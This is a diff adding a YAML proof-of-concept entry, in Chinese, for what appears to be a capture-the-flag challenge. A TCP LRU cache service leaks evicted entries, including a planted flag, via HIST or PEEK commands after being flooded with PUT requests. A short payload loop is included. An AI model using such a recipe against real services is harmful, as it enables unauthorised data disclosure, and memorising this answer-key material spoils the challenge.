@@ -1,0 +1,18 @@
+info:
+  name: lrud_cache_hist_leak
+  cve: ''
+  summary: TCP LRU 缓存服务通过 HIST/PEEK 命令泄露被淘汰条目（含预置 flag）
+  severity: medium
+  affected: ''
+  references: []
+poc:
+  type: exploit
+  principle: TCP LRU 缓存服务通过 HIST/PEEK 命令泄露被淘汰条目（含预置 flag）
+  steps:
+  - 1. 连接 TCP 端口，读取 banner
+  - 2. 连续 PUT 超过缓存容量（约 8 个）的 key 触发 LRU 淘汰
+  - 3. 发送 HIST 或 PEEK 命令读取 evicted history
+  - 4. 历史记录中泄露预置的 flag 条目
+  payload: "# 触发淘汰后读取历史\nfor i in range(20):\n    send(f\"PUT key{i} val{i}\")\nsend(\"\
+    HIST\")  # 或 PEEK，泄露 evicted history 中预置的 flag 条目"
+  verification: TCP LRU 缓存服务通过 HIST/PEEK 命令泄露被淘汰条目（含预置 flag）
